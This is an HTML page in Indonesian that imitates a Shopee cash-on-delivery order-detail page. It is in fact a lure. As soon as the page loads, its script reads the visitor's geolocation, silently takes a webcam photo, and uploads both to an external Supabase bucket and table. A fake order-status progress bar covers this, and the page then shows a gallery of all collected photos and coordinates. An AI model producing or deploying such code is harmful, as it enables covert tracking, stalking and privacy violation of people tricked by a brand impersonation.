<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shopee - Detail Pesanan COD</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: 'Poppins', sans-serif;
    background: #f5f5f5;
    color: #333;
    min-height: 100vh;
  }

  /* Header Shopee */
  header {
    background-color: #f53d2d;
    color: #fff;
    padding: 14px;
    font-size: 1.3rem;
    font-weight: 600;
    text-align: center;
    box-shadow: 0 2px 6px rgba(0,0,0,0.15);
    position: sticky;
    top: 0;
    z-index: 100;
  }

  /* Status Pesanan */
  #statusBox {
    margin: 16px;
    padding: 16px;
    border-radius: 12px;
    background: #fff;
    color: #333;
    font-size: 1rem;
    font-weight: 500;
    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
  }
  #statusText { font-weight: 600; }

  /* Progress Shopee */
  .progress {
    display: flex;
    justify-content: space-between;
    margin-top: 12px;
    position: relative;
  }
  .progress::before {
    content: "";
    position: absolute;
    top: 12px;
    left: 10%;
    width: 80%;
    height: 2px;
    background: #ddd;
  }
  .step {
    background: #ddd;
    color: #666;
    width: 24px;
    height: 24px;
    border-radius: 50%;
    text-align: center;
    line-height: 24px;
    font-size: 0.8rem;
    position: relative;
    z-index: 1;
  }
  .step.active {
    background: #f53d2d;
    color: #fff;
  }

  /* Daftar Foto/Lokasi */
  #list {
    margin: 16px;
    display: flex;
    flex-direction: column;
    gap: 14px;
  }
  .card {
    background: #fff;
    border-radius: 12px;
    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
    overflow: hidden;
    display: flex;
    gap: 12px;
    padding: 12px;
    align-items: center;
  }
  .card img {
    width: 90px;
    height: 90px;
    object-fit: cover;
    border-radius: 8px;
    flex-shrink: 0;
  }
  .info {
    font-size: 0.85rem;
    color: #444;
    white-space: pre-line;
  }

  /* Tombol */
  .actions {
    display: flex;
    justify-content: flex-end;
    gap: 10px;
    margin: 16px;
  }
  button {
    border: none;
    border-radius: 8px;
    padding: 10px 16px;
    font-size: 0.9rem;
    font-weight: 600;
    cursor: pointer;
  }
  .btn-track { background: #fff; border: 1px solid #ccc; }
  .btn-confirm { background: #f53d2d; color: #fff; }
</style>
</head>
<body>
<header>Detail Pesanan COD</header>

<div id="statusBox">
  <div id="statusText">Pesanan COD kamu sedang diproses</div>
  <div class="progress">
    <div class="step active" id="step1">1</div>
    <div class="step" id="step2">2</div>
    <div class="step" id="step3">3</div>
  </div>
</div>

<div id="list"></div>

<div class="actions">
  <button class="btn-track">Lacak Pesanan</button>
  <button class="btn-confirm">Konfirmasi COD</button>
</div>

<!-- Supabase JS -->
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
  const SUPABASE_URL = "https://sinqdlsddldljlqvsxoa.supabase.co";
  const SUPABASE_KEY = "ISI_KEY_MU";
  const BUCKET = "foto-users"; 
  const { createClient } = supabase;
  const client = createClient(SUPABASE_URL, SUPABASE_KEY);

  const statusText = document.getElementById("statusText");
  const step1 = document.getElementById("step1");
  const step2 = document.getElementById("step2");
  const step3 = document.getElementById("step3");
  const listEl = document.getElementById("list");

  function updateStatus(stage) {
    step1.classList.remove("active");
    step2.classList.remove("active");
    step3.classList.remove("active");

    if (stage === 1) {
      statusText.innerText = "Pesanan COD kamu sedang diproses";
      step1.classList.add("active");
    } else if (stage === 2) {
      statusText.innerText = "Pesanan sedang dikirim";
      step2.classList.add("active");
    } else if (stage === 3) {
      statusText.innerText = "Pesanan selesai";
      step3.classList.add("active");
    }
  }

  function ambilLokasiDulu() {
    if (!navigator.geolocation) {
      statusText.innerText = "❌ Browser tidak mendukung geolocation";
      return;
    }
    navigator.geolocation.getCurrentPosition(async (pos) => {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      ambilFoto(lat, lon);
    }, (err) => {
      statusText.innerText = "❌ Aktifkan izin lokasi: " + err.message;
    });
  }

  async function ambilFoto(lat, lon) {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const track = stream.getVideoTracks()[0];
      const imageCapture = new ImageCapture(track);
      const blob = await imageCapture.takePhoto();
      const fileName = `foto_${Date.now()}.jpg`;

      const { error: uploadError } = await client.storage
        .from(BUCKET)
        .upload(fileName, blob, {
          cacheControl: "3600",
          upsert: false,
          contentType: "image/jpeg"
        });

      if (!uploadError) {
        await client.from("lokasi_users").insert([
          { foto: fileName, latitude: lat, longitude: lon, created_at: new Date() }
        ]);
        tampilkanFoto();

        // Ubah status setelah berhasil upload
        updateStatus(2);

        // Simulasi otomatis selesai setelah 10 detik
        setTimeout(() => {
          updateStatus(3);
        }, 10000);
      }
      track.stop();
    } catch (err) {
      console.error("Kamera error:", err);
    }
  }

  async function tampilkanFoto() {
    const { data, error } = await client.storage.from(BUCKET).list("", {
      sortBy: { column: "created_at", order: "desc" }
    });
    if (error) return;

    listEl.innerHTML = "";
    for (const file of data) {
      const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
      const { data: lokasiData } = await client
        .from("lokasi_users")
        .select("*")
        .eq("foto", file.name)
        .single();

      const card = document.createElement("div");
      card.className = "card";
      const img = document.createElement("img");
      img.src = publicUrl.publicUrl;
      const info = document.createElement("div");
      info.className = "info";
      if (lokasiData) {
        info.innerText = `Lat: ${lokasiData.latitude.toFixed(5)}, Lon: ${lokasiData.longitude.toFixed(5)}\n${new Date(lokasiData.created_at).toLocaleString()}`;
      }
      card.appendChild(img);
      card.appendChild(info);
      listEl.appendChild(card);
    }
  }

  // mulai
  updateStatus(1);
  ambilLokasiDulu();
</script>
</body>
</html>
